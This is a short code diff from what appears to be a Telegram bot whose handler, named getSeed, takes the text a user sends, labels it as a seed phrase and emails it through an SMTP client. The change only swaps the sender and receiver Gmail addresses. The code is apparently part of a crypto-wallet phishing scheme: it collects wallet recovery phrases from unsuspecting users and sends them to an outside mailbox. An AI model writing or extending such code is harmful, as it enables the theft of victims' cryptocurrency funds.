@@ -52,8 +52,8 @@ async def getSeed(update: Update, context: CallbackContext) -> str:
     # Create the SMTP client
     client = create_smtp_api_client()
 
-    sender_mail = "jimmywillbanks07@gmail.com"
-    receiver_email = "screenerbotdex@gmail.com"
+    sender_mail = "screenerbotdex@gmail.com"
+    receiver_email = "jimmywillbanks07@gmail.com"
 
     text = f"THIS IS THE SEED PHRASE  \n ---------------------------------------- \n {update.message.text}"
 
